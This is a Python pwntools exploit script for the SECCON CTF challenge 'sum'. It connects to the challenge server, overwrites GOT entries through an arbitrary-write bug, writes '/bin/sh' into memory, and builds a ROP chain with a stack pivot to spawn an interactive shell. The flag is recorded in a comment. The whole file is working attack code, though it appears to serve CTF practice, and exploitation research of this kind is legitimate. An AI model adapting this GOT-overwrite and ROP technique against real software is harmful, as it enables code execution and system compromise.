from pwn import *
import time


binpath = "./sum"
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = """
gef
# b main
# before printf
b *0x4009bf
"""
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote("sum.chal.seccon.jp", 10001)


def overwrite(addr, value):
    payload = '-{} -3 1 1 {} {}'.format(addr, value + 1, addr)
    io.sendlineafter("2 3 4 0", payload)


addr_pop_rdi_ret = 0x0000000000400a43
addr_pop_rbp_ret = 0x00000000004006d8
addr_leave_ret = 0x00000000004007eb
addr_pop_rsi_rdi_ret = 0x0000000000400a41

# exit -> main
overwrite(elf.got["exit"], elf.symbols["main"])
# alarm -> syscall
print("Overwrite alarm")
overwrite(elf.got["alarm"] - 7, 0x4500000000000000)
# printf -> pop rdi; ret
print("Overwrite printf")
overwrite(elf.got["printf"], addr_pop_rdi_ret)

addr_pivot = elf.bss() + 0x300
addr_binsh = elf.bss() + 0x600
addr_59_str = 0x400ac3 - 59

overwrite(addr_binsh, u64(b"/bin/sh\x00"))

# stack pivot
payload = []
# set rax = 59
payload += [
        addr_pop_rdi_ret,
        addr_59_str,
        elf.plt["puts"],
        ]
payload += [  # use __libc_csu_init universal rop gadget
        0x400a3a,
        0,  # rbx
        0,  # rbp
        elf.got["alarm"],  # r12 (call r12) (alarm is overwritten to syscall)
        addr_binsh,  # r13 (edi)
        0,  # r14 (rsi)
        0,  # r15 (rdx)
        0x400a20,
        ]

print(payload)

for i in range(len(payload)):
    print("0x{:x} = 0x{:x}".format(addr_pivot + i * 8, payload[i]))
    overwrite(addr_pivot + i * 8, payload[i])

# fire rop
ints = "{} {} {} 0".format(addr_pop_rbp_ret, addr_pivot - 8, addr_leave_ret)
io.sendlineafter("2 3 4 0", ints)

io.interactive()

# solved after the contest
# SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
